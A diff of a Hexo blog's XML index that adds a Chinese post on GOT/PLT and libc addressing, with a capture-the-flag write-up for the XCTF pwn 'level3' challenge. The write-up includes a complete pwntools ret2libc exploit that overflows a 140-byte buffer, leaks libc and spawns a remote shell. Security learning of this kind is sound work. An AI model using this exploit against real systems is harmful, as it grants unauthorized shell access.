@@ -8,13 +8,32 @@
       <link href="/2020/05/23/mass/"/>
       <url>/2020/05/23/mass/</url>
       
-        <content type="html"><![CDATA[<pre><code>             hexo基本写文章操作：</code></pre><p>1：在自己本地blog文件夹git bash here<br><img src="https://s1.ax1x.com/2020/05/23/YjltX9.png" alt=""></p><p>2:在bash中：hexo n “name” 或是直接在_posts中写文章</p><p>3：文章中插入图片<br>    语法：</p><p>![图片alt](图片地址 ‘’图片title’’)</p><p>图片alt就是显示在图片下面的文字，相当于对图片内容的解释。<br>图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</p><p>4：图床：<a href="https://imgchr.com/matri_x" target="_blank" rel="noopener">https://imgchr.com/matri_x</a></p>]]></content>
+        <content type="html"><![CDATA[<pre><code>             hexo基本写文章操作：</code></pre><p>1：在自己本地blog文件夹git bash here<br><img src="https://s1.ax1x.com/2020/05/23/YjltX9.png" alt=""></p><p>2:在bash中：hexo n “name” 或是直接在_posts中写文章</p><p>3：文章中插入图片<br>    语法：</p><p>![图片alt](图片地址 ‘’图片title’’)</p><p>图片alt就是显示在图片下面的文字，相当于对图片内容的解释。<br>图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</p><p>4：图床：<a href="https://imgchr.com/matri_x" target="_blank" rel="noopener">https://imgchr.com/matri_x</a></p><p>5：hexo g //生成静态网页，用于测试<br>    hexo s  //打开本地服务器，结合用于测试<br>    hexo d  //上传到github发布</p>]]></content>
       
       
       
         <tags>
             
             <tag> mass </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>浅析got，plt，libc</title>
+      <link href="/2020/05/23/qian-xi-got-plt-libc/"/>
+      <url>/2020/05/23/qian-xi-got-plt-libc/</url>
+      
+        <content type="html"><![CDATA[<p>见详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/104224260" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/104224260</a></p><p>在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该函数的got表地址，跳到got表上。这个表上面存放被引用函数的真实地址。<br>为了程序运行时的效率，还没有引用某个函数时程序不会连接启用包括此函数这样就使程序运行速度更快。</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj19c4.png" alt="picture1"></p><p>libc文件里面包含大量函数包括system，read，write还有字符串/bin/sh ，libc在被程序引用时会分配到一个地址也就是libc的首地址，然后里面的函数或被程序引用。</p><p>引用过程：<br>首先libc分配到一个地址，他里面的函数字符串什么的本来就有内部基于libc首地址的偏移量，这些偏移量都是可以用ELF指令解析libc文件再用搜寻指令查到。所以一旦libc被引用分配得首地址libc里面所包括的所有函数和字符串地址就都确定了。call函数时用上述的plt，got表跳转寻址，最后通过重定位got表得到真实函数地址。</p><p>对应题目：xctf pwn level3<br>1:file</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1m9O.png" alt="picture2"></p><p>2:checksec</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1VN6.png" alt="picture3"></p><p>可以栈溢出，NX开启：rop绕过</p><p>3：ida</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1kH1.png" alt="picture4"></p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1EAx.png" alt="picture5"></p><p>查看buf的栈空间发现可以溢出：溢出量140</p><p>所以现在的思路就是：payload = “A”*140 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>所以得有哦system函数和binsh字符串   注意此处system函数的构建：函数地址+返回地址+函数参数  很多情况都是在栈中这样构建函数</p><p>4：ida查看函数与字符串</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1FBR.png" alt="picture6"></p><p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p><p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p><p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p><p>exp：<br>from pwn import*</p><p>sh = remote(“124.126.19.106”,52825)</p><p>#sh = process(“level3”)</p><p>elf = ELF(“level3”)<br>libc = ELF(“libc_32.so.6”)</p><p>write_plt = elf.symbols[‘write’]    #write函数的plt地址<br>write_got = elf.got[‘write’]  #write函数的got地址，该地址存放write真实地址<br>main_addr = 0x08048484 #main函数地址可以从ida直接看，也可以elf.symbols[‘main’]搜索</p><p>#print write_plt<br>#print write_got<br>#print main_addr</p><p>payload = “A”*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</p><p>#p.recv()<br>sh.recv() </p><p>sh.sendline(payload)</p><p>write_addr = u32(sh.recv(4))  #sh.recv(4)是接受4个字节的输出，u32和p32功能相反</p><p>#print write_addr</p><p>libc_addr = write_addr - libc.symbols[‘write’] #减去了write的offset</p><p>#print(hex(libc_addr))</p><p>#print “libc”+hex(libc_addr)</p><p>binsh_addr = libc_addr + libc.search(“/bin/sh”).next()  #得到binsh真实地址</p><p>#print “binsh_addr =&gt; “+hex(binsh_addr)</p><p>sys_addr = libc_addr + libc.symbols[‘system’]  #得到system真实地址</p><p>print “sys_addr =&gt; “+hex(sys_addr)</p><p>payload = “A”*140 + p32(sys_addr) + p32(0) + p32(binsh_addr)  #通过上次攻击返回地址位vulnerable函数可以再次攻击</p><p>sh.recv()</p><p>sh.sendline(payload)</p><p>sh.interactive()</p><p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p><p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
             
         </tags>
       
